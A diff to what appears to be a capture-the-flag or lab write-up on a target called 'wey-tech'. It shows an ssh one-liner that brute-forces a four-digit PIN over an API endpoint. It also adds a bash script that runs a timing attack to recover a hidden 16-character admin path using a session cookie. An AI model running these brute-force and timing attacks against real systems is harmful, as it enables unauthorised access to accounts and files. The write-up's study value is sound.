@@ -13,3 +13,21 @@ Configure Firefox to run through the proxy. A good addon is SmartProxy and you c
 ```
 $ ssh weytechuser@files.wey-tech.com 'for i in $(seq 1000 9999); do RESULT=$(curl http://10.4.4.80/api/confirm/abcd/$i 2>/dev/null); if [[ $RESULT == *"true"* ]]; then echo -e "\n$RESULT\nPincode: $i\n"; break; fi; done'
 ```
+
+## Bash script for timeout attack of a 16 byte random path
+```
+COOKIE="Cookie: session=<PLACE YOUR COOKIE HERE>"
+ADMINID=""
+for num in $(seq 0 15 | tac); do
+  ZZZs=$(eval "printf 'Z%.0s' {0..$num}")
+  PADDING=${ZZZs::-1}
+  for char in $(echo "abcdefghijklmnopqrstuvwxyz0123456789" | fold -w1); do  
+    RES=$(timeout "$(($num + 1))" curl -s "http://10.4.4.80/api/list/files/1/$ADMINID$char$PADDING" -H "$COOKIE")
+    if [ -n "$RES" ]; then
+      ADMINID="$ADMINID$char"
+      echo "Found another Character: $ADMINID"
+      break
+    fi
+  done
+done
+```
